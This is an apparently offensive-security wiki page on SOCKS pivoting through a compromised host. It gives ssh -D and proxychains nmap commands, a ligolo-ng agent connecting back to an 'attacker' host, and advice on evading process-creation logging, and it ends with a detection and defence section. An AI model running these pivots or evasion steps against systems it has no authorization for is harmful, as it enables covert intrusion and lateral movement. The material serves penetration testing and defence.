---
title: SOCKS proxies
slug: socks-proxies
---

> **TL;DR:** Tunnel arbitrary TCP (and via DNS-over-SOCKS, name resolution) from your attack box through a foothold using SOCKS — turning a single C2 implant into a network presence for Nmap, Impacket, browser, and Burp.

## What it is
SOCKS is a transport-agnostic proxy protocol (v4, v4a, v5). C2 frameworks expose a SOCKS server on the operator side that forwards new connections through the implant's existing back-channel. Combined with `proxychains` (or native SOCKS support in Impacket / browsers), every tool on the attacker box can pivot through the compromised host — no extra port-forward, no separate session.

## Preconditions / where it applies
- A live implant or shell with outbound C2 (Sliver beacon, Mythic, Cobalt Strike, Havoc, plain `chisel`, `ligolo-ng`, or `ssh -D`).
- Operator-side SOCKS listener reachable from local tooling (loopback is fine).
- For DNS resolution through the tunnel: SOCKS4a or SOCKS5 with `proxy_dns` (in `/etc/proxychains.conf`).
- Bandwidth budget — SOCKS amplifies traffic; Nmap scans through a beacon will be slow and noisy.

## Technique
SSH dynamic forward (quickest pivot — see [[ssh-execution]]):

```
ssh -D 1080 -N -f user@foothold
proxychains4 nmap -sT -Pn -p 445,3389 10.0.0.0/24
```

`ligolo-ng` (TUN-based, no proxychains needed):

```
# operator
./proxy -selfcert
# agent on foothold
./agent -connect attacker:11601
# in proxy console:
session 1
ifconfig
start
# attacker box gets a real route — use native nmap, smbclient, etc.
```

Impacket honours the `proxychains` LD_PRELOAD as well as native SOCKS via `-target-ip` workarounds. Burp and Firefox accept SOCKS5 directly under network settings — handy for pivoting to internal web apps. Note: ICMP and UDP do not traverse SOCKS (use `-sT` Nmap, skip ping).

Under-appreciated win: SOCKS pivots are a free command-line logging bypass. Running `proxychains rpcclient <dc> -U user` or `proxychains reg.py corp/admin@host query` from the attacker box means **no `net.exe`, `reg.exe`, or `wmic.exe` ever spawns on the foothold** — only the resulting SMB/RPC traffic crosses it. Hunts keyed on `Process Creation` events for `net user /domain`, `nltest`, etc. miss the activity entirely, because the syscall surface on the compromised host is just the beacon's existing outbound socket. Pair with a Cobalt Strike `socks 1080` (SOCKS4a) or Sliver's `socks5 start` to get the same effect through a beacon.

## Detection and defence
- Long-lived outbound C2 sessions with sustained, varied destination traffic patterns (TLS to one C2 IP carrying thousands of distinct internal destinations after decryption proxy).
- Egress filtering and inspection: block direct internet from servers, require explicit proxies, alert on non-browser TLS JA3 from server VLANs.
- Internal scan detection (Nmap fingerprints, sweep behaviour from a single host) catches noisy SOCKS-pivoted recon.
- Network segmentation limits what a single pivot can reach even with a working tunnel.

## References
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) — TUN-based pivot, defacto modern choice.
- [proxychains-ng](https://github.com/rofl0r/proxychains-ng) — config and DNS-through-SOCKS notes.
- [SOCKS pivoting — HackTricks](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html) — tool catalogue.
- [ired.team — Enumerating Windows domains via rpcclient through SOCKS](https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging) — command-line-logging bypass via proxychained enumeration.
